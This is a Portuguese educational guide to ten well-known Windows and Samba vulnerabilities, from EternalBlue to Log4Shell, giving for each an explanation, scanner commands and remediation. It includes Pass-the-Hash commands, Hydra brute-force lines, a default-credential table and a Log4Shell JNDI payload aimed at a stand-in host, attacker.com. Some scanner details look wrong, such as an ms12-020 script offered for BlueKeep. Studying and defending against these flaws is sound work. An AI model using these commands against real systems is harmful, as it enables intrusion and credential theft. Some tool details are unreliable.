# 🪟 Top 10 Vulnerabilidades de Serviços Windows

> Guia educativo das vulnerabilidades mais relevantes em ambientes Windows para estudos de ethical hacking e defesa.
> Cada item cobre: o que é, por que funciona, como detectar e como remediar.

---

## 🧠 Por Que Estudar Vulnerabilidades Windows

Windows domina ambientes corporativos. Entender suas vulnerabilidades clássicas é fundamental para:
- **Pentest:** saber o que procurar após o recon
- **Defesa:** saber o que proteger e monitorar
- **Certificações:** eJPT, OSCP, CEH cobram esses conceitos

---

## 1️⃣ MS17-010 — EternalBlue (SMB)

### O Que É
Vulnerabilidade crítica no protocolo **SMBv1** do Windows. Permite execução remota de código **sem autenticação** — RCE completo com apenas acesso à porta 445.

Vazada do arsenal da NSA em 2017. Usada no ataque **WannaCry** que infectou 200.000+ sistemas em 150 países.

### Por Que Funciona
O SMBv1 tem uma falha no tratamento de transações especiais (`SMB_COM_TRANSACTION2`). Um pacote malformado causa buffer overflow no kernel — execução de código como **SYSTEM**.

### Sistemas Afetados
| Sistema | Vulnerável |
|---------|-----------|
| Windows XP | ✅ |
| Windows 7 | ✅ |
| Windows 8 | ✅ |
| Windows Server 2003/2008/2012 | ✅ |
| Windows 10 (sem patch) | ✅ |
| Windows 10 (atualizado) | ❌ |

### Detecção
```bash
# Nmap NSE
nmap --script smb-vuln-ms17-010 -p445 IP

# Metasploit
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS IP
run
```

### Remediação
- Aplicar patch **MS17-010** (KB4012212)
- **Desabilitar SMBv1** (PowerShell): `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
- Bloquear porta 445 em firewalls de perímetro

---

## 2️⃣ MS08-067 — Vulnerabilidade no Serviço Server (RPC)

### O Que É
Vulnerabilidade no serviço **Windows Server** (serviço de compartilhamento de arquivos) via chamada RPC. Permite RCE sem autenticação através da porta 445 ou 139.

Base do worm **Conficker** que infectou milhões de máquinas.

### Por Que Funciona
O serviço não valida corretamente o tamanho de um caminho relativo de rede em uma chamada RPC. Buffer overflow → execução como **SYSTEM**.

### Sistemas Afetados
Windows XP, Server 2003, Vista, Server 2008 (sem patch).

### Detecção
```bash
nmap --script smb-vuln-ms08-067 -p445 IP

use auxiliary/scanner/smb/smb_ms08_067
```

### Remediação
- Aplicar patch **MS08-067** (KB958644)
- Sistemas XP/2003 devem ser descontinuados — sem suporte ativo

---

## 3️⃣ CVE-2017-7494 — SambaCry (Samba)

### O Que É
Vulnerabilidade no **Samba** (implementação SMB para Linux) que permite carregar uma biblioteca compartilhada maliciosa via um share com permissão de escrita. RCE sem autenticação se o share for gravável.

Apelidado de SambaCry por ser análogo ao EternalBlue, mas em sistemas Linux com Samba.

### Por Que Funciona
O Samba permite que clientes especifiquem o caminho completo de um pipe para conexão. Se o share for gravável, um atacante faz upload de um `.so` (shared library) e o Samba carrega e executa como root.

### Sistemas Afetados
Samba versões **< 4.6.4**, **< 4.5.10**, **< 4.4.14**.

### Detecção
```bash
nmap --script smb-vuln-cve-2017-7494 -p445 IP

use auxiliary/scanner/smb/smb_ms17_010  # verifica família
```

### Remediação
- Atualizar Samba para versão ≥ 4.6.4
- Adicionar `nt pipe support = no` no `smb.conf`
- Remover permissão de escrita em shares públicos

---

## 4️⃣ Null Session — Enumeração Anônima SMB

### O Que É
Configuração que permite conexão ao serviço SMB/IPC$ **sem credenciais**. Não é uma CVE — é uma misconfiguration que expõe enumeração completa do sistema.

### Por Que Funciona
O Windows/Samba antigo permitia conexão anônima ao IPC$ para compatibilidade com versões antigas do protocolo. Quando habilitado, qualquer usuário pode enumerar usuários, grupos, shares e políticas.

### O Que Expõe
- Lista completa de usuários locais
- Grupos e membros (incluindo Admins locais)
- Shares disponíveis
- Política de senha (lockout, complexidade)
- Informações do domínio/workgroup

### Detecção
```bash
# Testar null session
rpcclient -U "" -N IP
smbclient -L //IP -N
enum4linux -a IP
```

### Remediação
- Windows: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `RestrictAnonymous = 2`
- Samba: adicionar `restrict anonymous = 2` no `smb.conf`

---

## 5️⃣ Pass-the-Hash (PtH)

### O Que É
Técnica que usa o **hash NTLM** de uma senha diretamente para autenticar — sem precisar conhecer a senha em texto claro. O protocolo NTLM aceita o hash como prova de identidade.

### Por Que Funciona
O protocolo de autenticação NTLM é baseado em challenge-response usando o hash da senha. Se você tem o hash, você tem a capacidade de autenticar — **quebrá-lo é opcional**.

### Fluxo do Ataque
```
Comprometer um host
        ↓
Obter hash NTLM (hashdump, Mimikatz, secretsdump)
        ↓
Usar hash diretamente em outro sistema
sem precisar saber a senha em texto claro
```

### Ferramentas
```bash
# Impacket — múltiplos protocolos
python3 psexec.py -hashes :HASH_NTLM administrator@IP

# CrackMapExec
crackmapexec smb IP -u administrator -H HASH_NTLM

# Metasploit
use exploit/windows/smb/psexec
set SMBPass HASH_NTLM
set SMBUser administrator
```

### Remediação
- Habilitar **Protected Users** security group no AD
- Desabilitar **NTLM** e forçar **Kerberos**
- Habilitar **Windows Defender Credential Guard**
- Segmentar rede para limitar lateral movement

---

## 6️⃣ CVE-2020-1472 — Zerologon (Netlogon)

### O Que É
Vulnerabilidade crítica no protocolo **Netlogon** (MS-NRPC) que permite a qualquer usuário não autenticado na rede se tornar **Domain Admin** em segundos, sem nenhuma credencial.

Score CVSS: **10.0** — máximo possível.

### Por Que Funciona
O protocolo Netlogon usa AES-CFB8 com um IV previsível. Há ~1/256 de chance de um bloco de zeros ser encriptado como zeros. Com ~256 tentativas, é possível autenticar como qualquer máquina do domínio — incluindo o próprio Domain Controller — sem senha.

### Sistemas Afetados
Windows Server 2008, 2012, 2016, 2019 (sem patch de agosto 2020).

### Detecção
```bash
# Verificar
python3 zerologon_tester.py DC_NAME DC_IP

# Metasploit
use auxiliary/scanner/dcerpc/zerologon
```

### Remediação
- Aplicar patch de agosto 2020 (**KB4571694** e relacionados)
- Habilitar modo de aplicação obrigatória do Netlogon (fase 2 do patch)

---

## 7️⃣ CVE-2021-34527 — PrintNightmare (Print Spooler)

### O Que É
Vulnerabilidade no serviço **Windows Print Spooler** presente em todas as versões do Windows. Permite RCE remoto e elevação de privilégio local — ambos sem autenticação de administrador.

### Por Que Funciona
O serviço `spoolsv.exe` roda como **SYSTEM** e permite que usuários autenticados instalem drivers de impressora. Um driver de impressora malicioso é uma DLL que roda como SYSTEM.

### Dois Vetores
| Tipo | Acesso Necessário | Resultado |
|------|-----------------|----------|
| **RCE remoto** | Usuário de domínio qualquer | Execução remota como SYSTEM |
| **LPE local** | Usuário local qualquer | Elevação para SYSTEM |

### Detecção
```bash
# Verificar se Print Spooler está ativo
sc query spooler

# Testar vulnerabilidade
impacket-rpcdump @IP | grep -A 10 "MS-RPRN"
```

### Remediação
- Aplicar patch **KB5004945** e subsequentes
- **Desabilitar Print Spooler** em servidores que não precisam imprimir:
  `Stop-Service -Name Spooler -Force`
  `Set-Service -Name Spooler -StartupType Disabled`

---

## 8️⃣ CVE-2019-0708 — BlueKeep (RDP)

### O Que É
Vulnerabilidade crítica no protocolo **RDP** (Remote Desktop Protocol) que permite RCE **sem autenticação** através da porta 3389. Wormable — pode se propagar automaticamente entre sistemas vulneráveis.

### Por Que Funciona
Falha no componente de Desktop Gateway que manipula conexões RDP pré-autenticação. Buffer overflow no kernel → execução como **SYSTEM**.

### Sistemas Afetados
Windows XP, Vista, 7, Server 2003, Server 2008 (sem patch).
Windows 8, 10 e Server 2012+ **não** são afetados.

### Detecção
```bash
nmap --script rdp-vuln-ms12-020 -p3389 IP

use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

### Remediação
- Aplicar patch **CVE-2019-0708** (KB4499175)
- Habilitar **Network Level Authentication (NLA)**
- Não expor RDP diretamente à internet — usar VPN
- Bloquear porta 3389 em firewall de perímetro

---

## 9️⃣ Credenciais Padrão e Senhas Fracas

### O Que É
Não é uma CVE técnica — é a vulnerabilidade mais explorada na prática real. Sistemas Windows com contas usando senhas padrão, fracas ou inexistentes.

### Por Que Funciona
Administradores frequentemente:
- Deixam `administrator` sem senha em instalações novas
- Usam senhas triviais (`Password1`, `admin123`, `company2024`)
- Reutilizam senhas entre sistemas
- Nunca expiram senhas de serviço

### Principais Alvos
| Serviço | Credenciais Padrão Comuns |
|---------|--------------------------|
| SMB/Windows | `administrator:` (sem senha) |
| MySQL | `root:` (sem senha) |
| MSSQL | `sa:` (sem senha) |
| RDP | `administrator:password` |
| VNC | `password` ou `admin` |
| Telnet | `admin:admin` |

### Detecção
```bash
# SMB
use auxiliary/scanner/smb/smb_login
set USER_AS_PASS true
set BLANK_PASSWORDS true

# MySQL
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set BLANK_PASSWORDS true

# Hydra genérico
hydra -L users.txt -e nsr PROTOCOLO://IP
# -e nsr: n=sem senha, s=user=pass, r=reverso
```

### Remediação
- Política de senha forte (mínimo 12 chars, complexidade)
- Rotação periódica de senhas
- Auditoria regular de contas com senha fraca

---

## 🔟 CVE-2021-44228 — Log4Shell (Log4j) em Serviços Windows

### O Que É
Vulnerabilidade crítica na biblioteca **Log4j** (Java) — muito usada em aplicações rodando sobre Windows. Permite RCE através de qualquer campo de log que processe input do usuário.

Afeta qualquer aplicação Java que usa Log4j 2.x, rodando em qualquer OS — incluindo Windows Server com Tomcat, JBoss, Elasticsearch, VMware, etc.

### Por Que Funciona
O Log4j processa expressões especiais nos logs via JNDI (Java Naming and Directory Interface). A string `${jndi:ldap://attacker.com/exploit}` em qualquer campo logado faz o servidor Java conectar num servidor LDAP controlado pelo atacante e executar código.

### Sistemas Afetados
Log4j **2.0-beta9 até 2.14.1** em qualquer plataforma com JRE.

### Detecção
```bash
# Scanner de rede
use auxiliary/scanner/http/log4shell_header_injection

# Teste manual — injetar em User-Agent
curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' http://IP/
```

### Remediação
- Atualizar Log4j para versão **≥ 2.17.1**
- Variável de ambiente: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
- JVM flag: `-Dlog4j2.formatMsgNoLookups=true`

---

## 📊 Visão Geral Comparativa

| # | Vulnerabilidade | Porta | Auth Necessária | Impacto | Wormable |
|---|----------------|-------|----------------|---------|---------|
| 1 | EternalBlue | 445 | ❌ Não | SYSTEM | ✅ |
| 2 | MS08-067 | 445/139 | ❌ Não | SYSTEM | ✅ |
| 3 | SambaCry | 445 | ❌ Não (share público) | root | ❌ |
| 4 | Null Session | 445 | ❌ Não | Enumeração | ❌ |
| 5 | Pass-the-Hash | Vários | Hash NTLM | Admin remoto | ❌ |
| 6 | Zerologon | 445 | ❌ Não | Domain Admin | ❌ |
| 7 | PrintNightmare | 445 | Usuário básico | SYSTEM | ❌ |
| 8 | BlueKeep | 3389 | ❌ Não | SYSTEM | ✅ |
| 9 | Senhas Fracas | Vários | Credencial fraca | Varia | ❌ |
| 10 | Log4Shell | 80/443+ | ❌ Não | RCE | ✅ |

---

## 🔁 Workflow de Verificação em Pentest

```bash
# 1. Scan de portas e versões
sudo nmap -sV -p 139,445,3389,80,443 IP

# 2. Verificar SMB
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p445 IP
enum4linux -a IP                    # null session + enumeração

# 3. Verificar RDP
nmap --script rdp-vuln-ms12-020 -p3389 IP
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

# 4. Verificar credenciais padrão
use auxiliary/scanner/smb/smb_login
set BLANK_PASSWORDS true
set USER_AS_PASS true

# 5. Verificar versão do Samba
nmap --script smb-os-discovery -p445 IP
nmap --script smb-vuln-cve-2017-7494 -p445 IP

# 6. Verificar Print Spooler (se acesso à rede interna)
sc \\IP query spooler
```

---

## 🧠 Modelo Mental para Priorização

```
Sistema Windows encontrado
        ↓
SMBv1 ativo?     → EternalBlue (MS17-010) — crítico imediato
        ↓
RDP exposto?     → BlueKeep (CVE-2019-0708) — se Windows 7/2008
        ↓
Null session?    → Enumerar tudo sem credencial
        ↓
Política fraca?  → Brute force (Hydra, smb_login)
        ↓
Credencial obtida → Pass-the-Hash para lateral movement
        ↓
Domain Controller? → Zerologon — Domain Admin em segundos
```

---

## 📌 Relacionados

- [[SMB — Server Message Block]]
- [[Nmap — NSE]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[SMB Brute Force e Acesso a Shares]]
- [[Samba Recon Completo]]
- [[Hydra]]
- [[Cheatsheet — Portas Importantes]]

#windows #exploração #vulnerabilidades #conceito
